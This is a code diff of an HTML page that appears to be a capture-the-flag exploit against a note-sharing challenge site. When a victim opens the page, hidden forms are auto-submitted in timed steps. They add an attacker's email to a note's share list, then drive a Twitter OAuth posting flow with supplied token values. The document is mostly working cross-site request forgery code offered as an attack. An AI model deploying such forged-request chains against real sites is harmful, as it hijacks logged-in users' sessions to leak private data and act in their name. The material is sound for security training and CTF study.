@@ -13,19 +13,46 @@
 		<input type="submit" value="submit">
 	</form>
 
+	<form method="get" action = 'https://yeunote.ctf.yeuchimse.com/note/twitter/3' target="add_share"></form>
+	<form method="get" action = 'https://yeunote.ctf.yeuchimse.com/note/twitter' target="add_share">
+		<input name='oauth_token' />
+		<input name='oauth_verifier'/>
+	</form>
+
+
 	<script>Object.defineProperty(document, 'domain', {value: "yeunote.ctf.yeuchimse.com"});</script>
 	<script src="https://yeunote.ctf.yeuchimse.com/csrf.js"></script>
 
 
-	<iframe name = 'add_share'></iframe>
+	<iframe width=600 height=400 name = 'add_share'></iframe>
 
 	<script>
-		function send(){
+		function addToShare(post_id, email){
+			document.forms[0].action = `https://yeunote.ctf.yeuchimse.com/note/add_share/${post_id}`;
+			document.forms[0].querySelector('input[name=emails]').value = email;
 			document.forms[0].submit();
 		}
+
+		function prepareToTweet(post_id){
+			document.forms[1].action = `https://yeunote.ctf.yeuchimse.com/note/twitter/${post_id}`;
+			document.forms[1].submit();
+		}
+
+		function postTweet(oauth_token, oauth_verifier){
+			document.forms[2].oauth_token.value = oauth_token;
+			document.forms[2].oauth_verifier.value = oauth_verifier;
+			document.forms[2].submit();
+		}
 		function main(){
-			var crsf = document.querySelector('input[type=hidden]').value;
-			send()
+			// var crsf = document.querySelector('input[type=hidden]').value;
+			let post_id = 3,
+				email = 'my_email@foo.com',
+				oauth_token = 'token',
+				oauth_verifier = 'verifier';
+
+			addToShare(post_id, email);
+			setTimeout(prepareToTweet, 400, post_id);
+			setTimeout(postTweet, 800, oauth_token, oauth_verifier);
 		}
 
 		window.onload = main
